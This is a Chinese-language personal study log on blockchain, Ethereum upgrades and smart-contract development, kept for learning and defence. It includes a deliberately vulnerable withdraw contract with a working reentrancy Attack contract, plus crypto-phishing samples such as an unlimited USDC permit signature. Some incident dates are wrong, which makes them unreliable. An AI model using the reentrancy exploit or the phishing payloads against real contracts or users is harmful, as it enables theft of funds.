| **Gas 限额与使用量 (Gas Limit & Usage)** | 限额：`53,567`；实际使用：`52,775`（使用率 98.52%） |
| **基础费 (Base Fee)**                 | `0.001004132 Gwei`                    |
| **最大费用 (Max Fee)**                 | `1.5014732 Gwei`                      |
| **最大优先费 (Max Priority Fee)**       | `1.5 Gwei`                            |
| **销毁费用 (Burnt)**                   | `0.0000000529930663 ETH`              |
| **节省费用 (Txn Savings)**             | `0.0000000247550637 ETH`              |

## 调用函数
```
function leaveMessage(string _text)
```

## 交易输入数据
```
[0]: 000000000000000...00020  
[1]: 000000000000000...00005  
[2]: 68656c6c6f00000...00000
```
- `0x20`：字符串在 calldata 中的偏移量（32 字节后开始）。    
- `0x05`：字符串长度 = 5。    
- `0x68656c6c6f`：`"hello"`的ASCII码。

## EIP-1559 费用
是 **Type 2** 交易（EIP-1559 格式），Gas 费由两部分组成：
1. **Base Fee（基础费）**：由协议设定，并会被销毁（Burnt），防止通胀。    
2. **Priority Fee（优先费 / 小费）**：支付给矿工（现为验证者）作为打包激励。

# 2025-08-11

# DApp 开发生命周期

## 1) 需求与架构

- 明确 MVP：页面（运动员页/投资页）、最少合约（运动员 Token + 市场）、最少数据事件（比赛数据、训练打卡）。    
- 选链：EVM 兼容、手续费低（Polygon/Base/BNB/Inj ）。    
- 架构四件套：前端 + 智能合约 + **索引器**（读事件到数据库）+ 去中心化存储（IPFS/Arweave）。     
## 2) 合约开发

- 工具： **Hardhat**（生态全）。    
- 步骤：写合约 → 单元测试 → 本地链验证（anvil/hardhat node）。    
- 基于 OpenZeppelin（ERC-20/1155 + AccessControl）减少坑。 

## 3) 索引器

- 作用：把合约 **Events**（如价格变更、成交）消费进数据库，前端查询更快更灵活。    
- 方案：**The Graph/Subgraph** 或 **Ponder（TypeScript）**；存 PostgreSQL。    
- 产出：子图/处理器，定义要监听的事件字段与写库逻辑。     
## 4) 前端
- 框架：React/Next。    
- 钱包：MetaMask / WalletConnect。    
- 交互库：**Viem + Wagmi**（类型好、体验稳定；或 ethers.js）。    
- 页面：连接钱包、运动员列表/详情、下单/撤单、我的持仓。
## 5) 链交互

- 读取：调用合约 view 方法或从索引器取聚合数据。    
- 写入：用户用钱包签名，前端发交易，监听确认。    
- 处理好 pending/确认/失败三种状态。 

## 6) 预言机与外部数据（先做“半手动”）

- MVP 简化：先由“运营后台”或脚本把比赛/训练数据喂给合约（管理员角色）。    
- 进阶：接 **Chainlink** 或其他可信源，多源聚合、异常回退。 
## 7) 部署与上线

- 合约：先测试网（Sepolia/Holesky），再主网/侧链。    
- 前端：Vercel/Netlify（或部署到 **IPFS**）。    
- 验证：区块浏览器验证合约，准备最小使用手册/引导。 
## 8) 基础测试与安全

- 单元测试（合约）：价格更新、下单/撤单、权限。    
- E2E：前端脚本连测试网走一遍主流程。    
- 先自测 + 小范围内测，后续再考虑第三方审计/赏金。

# 2025-08-09

## 一、双重支付问题（Double-Spending）

### ​**​关键问题​**​

传统电子支付依赖金融机构作为第三方验证交易，防止同一笔资金被重复使用（双重支付）。这导致：

1. ​**​信任成本高​**​：需第三方担保交易有效性；
2. ​**​交易不可逆​**​：金融机构可仲裁争议，逆转交易，增加欺诈风险；
3. ​**​小额支付不可行​**​：高手续费限制微支付场景。

### ​**​解决方案：工作量证明（PoW）与区块链​**​

1. ​**​时间戳服务器+哈希链​**​
    - 每笔交易通过​**​时间戳​**​绑定到区块，并广播至全网；
    - 区块通过​**​哈希指针​**​连接成链，篡改任一区块需重做后续所有区块的哈希计算。
2. ​**​分布式共识机制​**​
    - 节点以​**​最长链为有效链​**​（代表最大算力投入）；
    - 诚实节点控制多数算力时，攻击者无法追上链的增长速度（概率指数级下降）。



## 二、去中心化网络下的信任建立

### ​**​关键问题​**​

如何在无中心机构的点对点网络中，确保所有节点对交易顺序达成一致？

### ​**​解决方案：激励机制与PoW​**​

1. ​**​工作量证明（PoW）​**​
    - 节点通过计算寻找满足难度目标的​**​Nonce值​**​（如SHA-256哈希值以多个0开头），消耗CPU算力证明“诚实工作”；
    - ​**​“一CPU一票”​**​ ：算力决定投票权重，替代易被操控的IP投票机制。
2. ​**​经济激励​**​
    - ​**​区块奖励​**​：矿工打包新区块可获得新生成的比特币（初始50 BTC/区块）；
    - ​**​交易手续费​**​：输入值与输出值的差额作为手续费，长期替代区块奖励。



## 三、数据存储与验证效率

### ​**​关键问题​**​

区块链数据随时间线性增长，全节点存储负担重，轻节点如何快速验证交易？

### ​**​解决方案：默克尔树与简化支付验证（SPV）​**​

1. ​**​默克尔树（Merkle Tree）​**​
    - 交易哈希值逐层计算生成​**​根哈希​**​存储于区块头（仅80字节），老区块可删除交易细节保留根哈希。
2. ​**​SPV（Simplified Payment Verification）​**​
    - 轻节点仅保存​**​区块头​**​，通过验证Merkle分支确认交易是否被纳入区块；
    - 依赖诚实节点警报机制：发现无效区块时通知全网下载完整数据。



## 四、隐私保护与匿名性

### ​**​关键问题​**​

公开账本如何平衡透明性与用户隐私？

### ​**​解决方案：密码学匿名机制​**​

1. ​**​公钥匿名​**​
    - 交易记录显示地址间的转账，但​**​不绑定用户真实身份​**​（类似股市交易）；
2. ​**​动态地址生成​**​
    - 每次交易生成​**​新地址​**​，避免地址复用导致行为溯源。



## 五、对智能合约开发者的启示

|​**​比特币设计​**​|​**​智能合约应用​**​|
|||
|工作量证明（PoW）|共识算法选择（如PoS、PoA）|
|默克尔树|高效状态验证（如以太坊状态树）|
|经济激励|代币经济模型设计（DeFi、GameFi）|
|简化支付验证（SPV）|轻客户端开发（钱包、跨链桥）|

可结合​**​Solidity语言​**​和​**​以太坊虚拟机（EVM）​**​ [智能合约开发指南]

# 2025-08-08

智能合约相关安全事件：

- **The DAO事件（2016年）**：黑客利用智能合约中的重入漏洞，从自治基金合约中盗走360万个以太币，导致以太坊社区不得不进行硬分叉，这是智能合约安全史上的典型严重事件。[nsfocus](https://blog.nsfocus.net/securityloophole/)
  原理：
	- 通过被攻击者控制的恶意合约发起一笔非预期的外部调用打断目标合约的正常执行逻辑，绕过代码的限制条件，一直重复绕过这个限制条件。(打个比方，比如现在去一个设计有缺陷的ATM提款，插入卡片后输入提现1000，ATM机开始数钱，但是还没数出来，账户余额也还没被扣除这1000的那个瞬间，有个黑客利用这个缺陷的漏洞控制ATM"重新"执行一次'提现1000'，然后ATM再次检查账户发现，欸对耶，钱还够，又数了一次钱，然后这个过程不断重复，知道现金提空，而银行账户最终只会被扣一次款)
![](Pasted%20image%2020250808155506.png)
	
```
// 警告：这是一个有严重漏洞的合约！
contract EtherStore {
    mapping(address => uint) public balances;

    // ... 省略存款等其他函数 ...

    function withdraw(uint _amount) public {
        // 1. 检查余额是否足够
        require(balances[msg.sender] >= _amount);

        // 2. 转账给调用者 (问题所在！)
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        // 3. 更新账户余额
        balances[msg.sender] -= _amount;
    }
}
```

```
import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // fallback 函数是关键，当合约收到以太币时会被触发
    fallback() external payable {
        // 只要 EtherStore 合约的余额还大于1 ETH，就继续调用它的 withdraw 函数
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        etherStore.deposit{value: 1 ether}(); // 先存入 1 ETH
        etherStore.withdraw(1 ether);          // 发起第一次提款
    }
}

```

攻击流程：
1. 1. 黑客调用 `Attack.attack()`，存入 1 ETH 到 `EtherStore`，然后立刻要求提领这 1 ETH。
2. `EtherStore.withdraw()` 开始执行。它检查黑客的余额（1 ETH），检查通过。
3. `EtherStore` 执行 `msg.sender.call{value: 1 ether}("")`，试图将 1 ETH 还给黑客的 `Attack` 合约。
4. **关键点**：当 `Attack` 合约收到这笔以太币时，它的 `fallback()` 函数被触发了。
5. 在 `fallback()` 函数中，黑客**再一次（重入）调用了 `EtherStore.withdraw()`，要求再提领 1 ETH。
6. **致命漏洞**：因为 `EtherStore` 的代码还没执行到第3步（更新余额），所以它账上的记录依然是「黑客还有 1 ETH」。因此，第二次的余额检查**再次通过**！
7. `EtherStore` 又一次尝试发送 1 ETH 给黑客，这又触发了黑客的 `fallback()`，形成一个无限循环，直到 `EtherStore` 合约的资金被掏空为止。[原理和预防](https://learnblockchain.cn/article/18336)

- **Poly Network攻击（2020年）**：该跨链DeFi平台因智能合约控制权被黑客夺取，导致6.12亿美元被盗，凸显智能合约跨链和控制权限的安全风险。[c-csa](https://c-csa.cn/u_file/photo/20230518/29d8ed085d.pdf)
    
- **闪电贷攻击事件**：如2020年bZx借贷协议遭两次闪电贷攻击，损失近百万美元，利用智能合约机制中的价格预言机和市场操纵漏洞进行攻击。2023年Euler Finance利用闪电贷漏洞被盗约1.97亿美元，亦是智能合约中的市场机制漏洞利用典型。[panewslab+2](https://www.panewslab.com/zh/articles/oebo032n)
    
- **Parity多重签名钱包漏洞（2017年）**：因智能合约库存在漏洞，约51.37万个以太币被永久锁定。[c-csa](https://c-csa.cn/about/news-detail/i-336.html)
    
- **Bancor平台管理员权限被盗（2018年）**：智能合约中管理员权限过高导致盗取价值数千万美元币资。[c-csa](https://c-csa.cn/about/news-detail/i-336.html)
    
- **Lendf.Me重入漏洞攻击（2020年）**：智能合约中存在重入漏洞和特定代币兼容性问题，导致2500万美元资产被盗。[简介](https://abmedia.io/lendf-me-hacked-details-analysis-and-defense-suggestions)
    
- **跨链桥智能合约漏洞攻击（2024年）**：如BSC Token Hub跨链桥被攻击，伪造交易提取大量币，显示跨链智能合约风险居高不下。[简介](https://blog.csdn.net/weixin_42056967/article/details/127212623)
- 原因：Merkle验证机制的漏洞
	- BNB链上的预编译合约（地址0x65）负责验证跨链提交的Merkle Proof，但它对包含多个叶子节点（Leaves）的Proof处理不严谨，只针对单个叶子的情况验证，导致边界情况处理漏洞。   
	- 攻击者构造包含多个叶子的恶意Proof数据，绕过了合约的校验机制，从而虚假证明了大量BNB的合法性，合约误判通过验证，造成了BNB的额外增发。

# 2025-08-07

# USDC Permit 釣魚
```
通過使用 EIP-2612 permit 簽名, 允許地址 0x1234...7890 使用你的全部 USDC 餘額，直到 2025/9/6 17:36:29
 "message": {
    "owner": "0xBF654d909728d4a40ADBFfB2A5Dc540827D158D8",
    // 授权的地址
    "spender": "0x1234567890123456780012345678901234567890",
    //无限制金额
    "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
    "nonce": 239360,
    // 过期时间
    "deadline": 1757151389
  },
   "signature": "0xb7acd5664a80a168686b63e6a568de4ae24b8859adfae99c704c3d58ec2d1c1836885351342772d18411a76c48dc776ade1c6e6c2a60f129feabad8aff5d08581b",
  "r": "0xb7acd5664a80a168686b63e6a568de4ae24b8859adfae99c704c3d58ec2d1c18",
  "s": "0x36885351342772d18411a76c48dc776ade1c6e6c2a60f129feabad8aff5d0858",
  "v": 27
```

# 空头诈骗
向合约f832a0发送0.5ETH。
函数选择器调用SecurityUpdate() 的函数，将资金转移给攻击者
![](Pasted%20image%2020250807174651.png)
# 授权钓鱼攻击
当心increaseAllowance函数，可以增加代币授权额度
![](Pasted%20image%2020250807175204.png)

# 超高收益質押平台
```
预计变化
您正在授予其他人从您的账户中花费该金额的权限。
支出上限
**无限制**
0x87350...57C75
消费者
0x00000...60000
请求来自
unphishable.io
```

# Telegram 代幣釣魚挑戰
* 未經請求的免費代幣或空投消息
- 領取獎勵的緊迫感或時間壓力
- 要求提供助記詞或私鑰
- 承諾高價值獎勵
- 語法或拼寫錯誤
# Punycode 釣魚攻擊
定义：Punycode 是一种编码系统，允许将非 ASCII 字符（如西里尔字母、中文等）转换为 ASCII 字符，以便在域名系统中使用。攻击者经常利用视觉上相似的字符创建看似合法的域名。 例如，某些特殊字符看起来与拉丁字母几乎相同，但它们是不同的字符： 你可以使用 [Punycoder](https://www.punycoder.com/) 来转换 Unicode 和 Punycode 域名。

# Microsoft Teams 恶意软件钓鱼模拟
* 可疑 URL：注意域名是 "microsoft-meet.com" 而不是 "teams.microsoft.com"
- 简化界面：与真实的 Teams 登录相比，虚假页面具有简化的界面
- 缺乏安全功能：缺少 Microsoft 通常包含的安全元素
- 加入按钮：突出的 "在 Teams 应用程序中加入" 按钮可能会导致恶意软件下载
- TEAMS_MALWARE_2025

# 假冒扩展钓鱼
安装虚假扩展程序办法：
1. 创建一个新钱包（最好在新浏览器上）并将所有资金从受损钱包中转出
2. 卸载扩展程序
3. 更改所有可能已被泄露的密码
4. 检查您的加密货币钱包中是否有未经授权的交易
5. 使用信誉良好的防病毒软件扫描您的设备以查找恶意软件
6. 监控您的账户是否有可疑活动
7. 考虑使用硬件钱包以获得额外安全性

# 2025-08-06

目標：智能合約工程師
* 開發、部署智能合約，確保合約的安全性、可靠性、高效性
* solidity(現在solana使用的是rust)
* 根據需求設計合適的智能合約架構
* 部署智能合约至区块链网络（如以太坊、Polygon、Arbitrum、Base 等），并确保合约的高效执行。
- 编写智能合约的单元测试，进行代码审计与安全性测试，确保合约代码无漏洞，避免潜在的安全风险。
- 優化合約，減少gas費用
- 熟悉 Ethereum、Polygon、Arbitrum、Base 等主流区块链平台，能够在这些平台上部署和维护智能合约
- 了解智能合约开发的安全性问题，具备智能合约审计和漏洞修复经验，熟悉常见的攻击模式（如重入攻击、溢出、权限管理等）
- 熟悉区块链的基本原理，理解 Gas 费用、交易确认、区块链共识机制等概念。
- 熟练使用 Foundry、Hardhat、Remix 等智能合约开发框架，具备项目开发、测试与部署经验。
- 具备一定的 Viem、Web3.js、Ethers.js 等 Web3 工具使用经验，能够与前端或其他系统进行无缝集成。
- 熟悉 IPFS、NFT、Token 标准（ERC-20、ERC-721、ERC-1155 等）及去中心化身份（DID）等 Web3 相关技术
```# 常用技术栈
- Solidity
- Remix
- Foundry / Hardhat
- Phalcon / Tenderly
- Yul
```
求職平臺：
- [DeJob](https://www.dejob.top/) - 中文，大量高频工作机会
- [SmartDeer](https://www.smartdeer.com/) - 中文，综合性的招聘平台
- [电鸭社区](https://eleduck.com/) - 中文，远程工作者社区
- [Web3Career](https://web3.career/) - 英文，专业的 Web3 招聘平台
- [CryptoJobs](https://crypto.jobs/) - 英文，区块链行业招聘信息
- [LInkedin](http://linkedin.com/) - 英文

# 2025-08-05

## 智能合约
定义：存储在区块链上的可执行代码，能够在满足预设条件时自动执行操作，无需人工干预。
影响：在数字货币以外，可以构建去中心化应用(DApp)、非同质化代币（NFT）等生态系统的基础设施

|维度|比特币（Bitcoin）|以太坊（Ethereum）|
|---|---|---|
|**目标与定位**|去中心化的数字货币，强调安全、稳定和稀缺性（总量 2100 万枚）|去中心化平台，支持智能合约和 Dapps，定位为“区块链 2.0”|
|**编程能力**|脚本语言有限，仅支持简单的交易验证逻辑|图灵完备的编程语言（如 Solidity），可开发复杂智能合约|
|**共识机制**|工作量证明（PoW），矿工通过算力竞争记账权|从 PoW 转向权益证明（PoS），通过 The Merge 实现能源效率优化|
|**交易速度**|每 10 分钟生成一个区块，交易确认较慢|区块时间约 12 秒，交易确认更快，适合高频应用|
|**经济模型**|总量固定，强调抗通胀属性|供应灵活，通过 EIP-1559 等机制可能呈现通缩趋势|


## 以太坊演进
### 1.0
使用PoW(工作量证明)
* 矿工通过计算机算力“挖矿”，争夺打包交易的权利。
- 矿工需要消耗大量电力资源，竞争激烈。
- 成功打包区块的矿工会获得新生成的 ETH 奖励。
问题：
* **能耗高**：全球以太坊矿工的电力消耗相当于一个小国家的用电量。
- **扩展性差**：每秒只能处理约 30 笔交易（TPS），速度慢、费用高。
解决方案：
* Homestead：修复安全漏洞，优化 Gas 计算，加入新操作码。
* Metropolis：
	* Byzantium：
		* 引入 zkSNARKs 支持（零知识证明）。
		- 降低难度炸弹(Difficulty Bomb)影响（推迟PoS切换时间）
	* Constantinople：
		* 减少某些操作Gas费用。  
		- 延后难度炸弹。
		- PS: Difficulty Bomb = 挖矿越来越难 + 区块时间变长 + 以太坊“冻结” = 社区必须升级或停摆。
- Istanbul：
	- 提升EVM性能。
	* 加强与Zcash等其他链的兼容性。

### 2.0
事件：The Merge
* Beacon Chain：
	* 引入PoS
	* 实现质押机制
	* 构建PoS验证者网络
	* 和主网并行存在，互不干扰
* London 升级
	* 改革交易手续费机制，引入'基础费+小费'模型
	* 提高Gas预测准确性，减少网络拥堵
	* 一部分 ETH 会被销毁（deflationary mechanism）
* **The Merge**(2022.09.15)
	* 正式从 PoW 切换至 PoS，标志性升级
	* Beacon 链接管共识, 将共识机制“插接”到信标链的 PoS 系统   
	- 废除挖矿，提高网络安全
	- PoS：
		- 准入门槛：质押 32 ETH 成为验证者
		- 工作方式：系统随机选择验证者来提议和验证区块
		- 奖励机制：验证者获得新发行的 ETH + 交易费用
		- 惩罚机制：作恶者质押的 ETH 被销毁（Slashing）
		* 相比 PoW 的优势
			- **能耗降低 99.95%**：无需大量电力和硬件
			- **经济安全性**：攻击成本约需控制全网 67% 的质押 ETH（价值数百亿美元）
			- **最终确定性**：区块确认更快、更可靠
- Shapella（Shanghai + Capella，2023.04）:
	- 支持质押 ETH 的提款（EIP-4895）
- Dencun（Deneb + Cancun）:
	- 实现数据分片原型，降低L2费用，提高扩容性。
	- 专注于**数据分片**，配合 Layer 2 实现扩容
	- 主网专注安全和数据可用性，Layer 2 负责大量交易处理
	- 引入 Proto-Danksharding（EIP-4844）
		- **问题**：以前 L2 提交数据需要使用常规交易，成本高昂
		- **解决方案**：引入专门的“Blob 交易”类型，数据存储成本大幅降低
		- **技术细节**：Blob 数据会在一定时间后自动删除，不会永久占用主网存储
	- ZK-Rollup
		- **批量处理**：在链下一次性处理数百笔交易
		- **零知识证明**：生成一个简洁的“正确性证明”
		- **主网验证**：以太坊只需验证这个证明，无需重新执行所有交易

# 2025-08-04

# 区块链
* 定义：去中心化的分布式账本技术，用于在网络节点之间安全、透明且不可篡改地记录事务数据。
* 组成：区块 + 链
	* 区块：交易记录 + 前一个区块hash
		* 存储有限(存储是真的贵啊)
			* 主要解决方案：
				* **链下存储+链上验证**：IPFS、Swarm、Arweave 等兴起，链上仅存摘要或引用
				* **模块化区块链 / 数据可用性层**：Celestia、Avail、EigenDA。“共识”“执行”“数据可用性”拆分成独立模块，数据层只负责广播数据，不必所有节点都存储
				* **Layer 2 Rollup + Validity/Optimistic Proofs**：zkRollup，Optimistic Rollup（Arbitrum, Optimism）。将大量交易和数据在链下处理，仅将结果及证明回传主链
				* **去中心化数据库和索引服务**：The Graph、Lighthouse、Fluence。提供索引和查询服务，将复杂数据查询从链上移至链下
		* 每个区块会在一定时间内打包，例如大概 10 分钟打包生成一个(BTC)。如下表

| 区块链                     | 共识机制                  | 打包时间       | 特点                               |
| ----------------------- | --------------------- | ---------- | -------------------------------- |
| **比特币**                 | PoW (SHA-256)         | ~10 分钟     | 最稳健，出块慢，安全性高                     |
| **以太坊**                 | PoS（现为Casper）         | ~12 秒      | 合并前是 PoW（13-15秒），合并后略快           |
| **BNB Chain**           | PoSA（混合PoS+Authority） | ~3 秒       | 高吞吐，中心化程度较高                      |
| **Solana**              | PoH + PoS             | ~0.4 秒     | 极快出块，高性能，但曾因宕机受质疑                |
| **Avalanche**           | Avalanche Consensus   | ~1-2 秒     | 并行处理交易，高速可扩展                     |
| **Cosmos**              | Tendermint（BFT类）      | ~6-7 秒     | 快速确认，适用于跨链通信                     |
| **Arbitrum / Optimism** | Layer2 Rollup         | 以太坊 L1区块为锚 | Rollup 本身秒级处理，但上链结算需要等待 L1 的确认时间 |
| **Celestia**            | Modular + DA层         | ~3-5 秒     | 仅负责数据可用性，不执行交易                   |

	* 链：
		* 一条链只可以链接两个区块。
		* 区块按照顺序串联
* 特点：
	* 不可篡改：无法改变历史信息，因为每个区块包含了上一个区块的摘要并串联起来，如果你修改了历史的区块，你将必须修改后面的全部区块。
		* 篡改条件：（成本高，难度大）
			* 重写目标区块及其后的所有区块  
			- 控制全网 51% 的计算能力（PoW）
			- 避免被其他 honest 节点识破并拒绝同步
			- 快速追赶并超过现有合法最长链
	* 公开透明，匿名
	* 快速交易：相比传统的跨国汇款非常快速便捷。


# 2025.07.30


<!-- Content_END -->
